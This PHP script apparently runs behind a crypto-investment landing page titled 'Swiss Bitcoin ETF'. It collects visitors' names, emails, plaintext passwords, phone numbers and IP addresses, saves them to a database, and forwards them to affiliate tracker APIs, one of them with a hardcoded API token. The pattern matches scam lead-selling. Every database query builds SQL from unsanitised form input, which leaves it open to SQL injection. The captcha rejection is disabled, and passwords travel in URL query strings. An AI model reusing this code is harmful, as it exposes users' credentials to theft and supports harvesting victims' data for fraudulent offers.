<?php
require 'config.php';
require 'hCaptcha.php';

$hCaptcha = @$_POST['h-captcha-response'];

if(!empty($hCaptcha)){
    $hCaptcha_verify = hCaptchaVerify($hCaptcha);

    $log  = "hCaptcha: ".$hCaptcha.PHP_EOL.
        "-------------------------".PHP_EOL;
//Save string to log, use FILE_APPEND to append.
//file_put_contents('log_'.date("j.n.Y").'.log', $log, FILE_APPEND);


    if($hCaptcha_verify == true){
    }
    #else{
    #    die;
   # }
}

//API #1 $URL = 'https://hyjatoce.ciperyur.com/tracker';
$URL = 'https://vip.qojyxayv.com/tracker';

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}

$first_name = $_POST['first_name'] ?? 'empty';
$last_name = $_POST['last_name'] ?? 'empty';
$email = $_POST['email'] ?? 'empty';
$password = $_POST['password'] ?? 'empty';
$phonecc = $_POST['phonecc'] ?? 'empty';
$phone = $_POST['phone'] ?? 'empty';
$user_ip = $_SERVER['REMOTE_ADDR'];
$aff_sub = $_POST['aff_sub'] ?? 'empty';
$aff_sub2 = md5($email) ?? 'empty';
$aff_sub3 = $_SERVER['SERVER_NAME'];
$aff_sub4 = $_POST['aff_sub4'] ?? 'empty';
$aff_id = 'empty';
$offer_id = 'empty';
$orig_offer = 'empty';
$click_id = 'click_id';

$phone = removeCountryCode($_POST['phone']);

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'empty';

$ccodes = array(
	'49' => ['name' => 'Germany', 'code' => 'DE'],
	'423' => ['name' => 'Liechtenstein', 'code' => 'LI'],
	'352' => ['name' => 'Luxembourg', 'code' => 'LU'],
	'43' => ['name' => 'Austria', 'code' => 'AT'],
	'41' => ['name' => 'Switzerland', 'code' => 'CH'],
);

$country = 'India';
$countryCode = "IN";
//$log = "$response";

//$country = geoip_country_name_by_name($user_ip);

if (isset($_SERVER["HTTP_CF_IPCOUNTRY"])) {
  $countryCode = $_SERVER["HTTP_CF_IPCOUNTRY"];
} else {
	$countryCode = $ccodes[$phonecc]['code'];
}

if($phonecc !== 'empty') {
	$countryCode = $ccodes[$phonecc]['code'];
	$country = $ccodes[$phonecc]['name'];
}


//$log = $response;

//$code = $_COOKIE['cc_'] ?? '';

$code = $countryCode;

$status = "";

$log = "";


$sql = "INSERT INTO user_data (code, first_name, last_name, email, phonecc, phone, user_ip, user_agent, country, aff_sub, aff_sub2, aff_sub3, aff_sub4, aff_id, offer_id, orig_offer, status, log)
VALUES ('".$code."','".$first_name."', '".$last_name."', '".$email."', '".$phonecc."', '".$phone."', '".$user_ip."', '".$user_agent."', '".$country."', '".$aff_sub."', '".$aff_sub2."', '".$aff_sub3."', '".$aff_sub4."', '".$aff_id."', '".$offer_id."', '".$orig_offer."', '".$status."', '".$log."')";

$last_id = "";

if ($conn->query($sql) === TRUE) {

    $last_id = $conn->insert_id;

  //echo "New record created successfully";
} else {
  //echo "Error: " . $sql . "<br>" . $conn->error;
}

//$conn->close();


$domain = substr($email, strpos($email, '@') + 1);
$sql = "SELECT domain FROM blacklist_domains WHERE domain = '". $domain."'";

$result = $conn->query($sql);

$domain_blacklisted = false;


if (($result->num_rows >= 1)) {
  $domain_blacklisted = true;
} else {
  $domain_blacklisted = false;
}

$status = 'error';


if($domain_blacklisted == false){

  $sql = "SELECT * FROM api_settings WHERE country_code = '". $countryCode."'";

  $result = $conn->query($sql);


  if ($result->num_rows > 0) {
    // API #2 follows and output data of each row
    $row = $result->fetch_assoc();
    $api_url = $row["url"];

    $URL = $api_url;

    $parsed = parse_url($api_url);

    $host = $parsed["host"];

    if($host == "cryp.im"){

      $apiData = [
        "flow_hash" => "65bcceeec70ba07734",
        "landing" => "Swiss Bitcoin ETF",
        'first_name' => $first_name,
        'last_name' => $last_name,
        'email' => $email,
        'phone' => "+".$phonecc.$phone,
        "ip" => $user_ip,
        "sub1" => $aff_sub,
        "sub2" => $aff_sub2,
        "sub3" => $aff_sub3,
        "sub4" => $aff_sub4,
        "click_id" => $click_id,
        "user_agent" => $user_agent,
        "test" => "1"
      ];
	  $api_token='glvfvNaLCWpdvNj4GFxfWe87I7GTOQ64JFl54ieTy8PbHoPCQ6ToYgqI52zw';
	  $query_params = http_build_query([
			'api_token' => $api_token
		]);

      $json = json_encode($apiData);

      $ch = curl_init($URL. '?' . $query_params);

      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Content-Length: ' . strlen($json)
      ));

      $response = curl_exec($ch);
      $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

	  header_remove();
      http_response_code($code);

    }else{
        $aff_id = '22257';
        $offer_id = '1737';
        $orig_offer = '4998';
        $apiData = [
            'first_name' => $first_name,
            'last_name' => $last_name,
            'email' => $email,
            'password' => $password,
            'phonecc' => $phonecc,
            'phone' => $phone,
            'user_ip' => $user_ip,
            'aff_sub' => $aff_sub,
            'aff_sub2' => $aff_sub2,
            'aff_sub3' => $aff_sub3,
            'aff_sub4' => $aff_sub4,
            'aff_id' => $aff_id,
            'offer_id' => $offer_id,
            'orig_offer' => $orig_offer
      ];

      try {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $URL . '?' . http_build_query($apiData));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

            $response = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

            header_remove();
            http_response_code($code);

      } catch (\Throwable $th) {
        //throw $th;
      }


      $sql = "UPDATE user_data SET aff_id = '".$aff_id."', offer_id = '".$offer_id."', orig_offer = '".$orig_offer."' WHERE id=$last_id";

        if ($conn->query($sql) === TRUE) {
        //echo "Record updated successfully";
        } else {
        //echo "Error updating record: " . $conn->error;
        }

    }
}else{
      $apiData = [
        'first_name' => $first_name,
        'last_name' => $last_name,
        'email' => $email,
        'password' => $password,
        'phonecc' => $phonecc,
        'phone' => $phone,
        'user_ip' => $user_ip,
        'aff_sub' => $aff_sub,
        'aff_sub2' => $aff_sub2,
        'aff_sub3' => $aff_sub3,
        'aff_sub4' => $aff_sub4,
        'aff_id' => $aff_id,
        'offer_id' => $offer_id,
        'orig_offer' => $orig_offer
      ];

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $URL . '?' . http_build_query($apiData));
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

      $response = curl_exec($ch);


      $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

      header_remove();
      http_response_code($code);
    }

}
else{
  $status = 'blacklist';
  $response = "blacklist_domain";
}

//Database Entry

if($code == 200){
    $status = 'success';
}

if(!isJson($response)) {
    $response = json_encode(['message' => 'Response is a html', 'result' => 'error']);
    $status = 'error';
}

echo $response;

$sql = "UPDATE user_data SET status = '".$status."', log = '".$response."' WHERE id=$last_id";

if ($conn->query($sql) === TRUE) {
  //echo "Record updated successfully";
} else {
  //echo "Error updating record: " . $conn->error;
}

$conn->close();

die;


function removeCountryCode($number) {
    $countryCodes = array('49', '423', '352', '43', '41');

    // Remove non-numeric characters
    $number = preg_replace('/[^0-9]/', '', $number);

    // Check if number starts with any country code
    foreach ($countryCodes as $code) {
        if (strpos($number, $code) === 0) {
            // Remove country code
            $number = substr($number, strlen($code));
            break;
        }
    }

    return $number;
}

function isJson($var) {
    // Attempt to decode the JSON string
    $decoded = json_decode($var);

    // Check if decoding was successful and the result is not null
    return $decoded !== null && $decoded !== false;
}
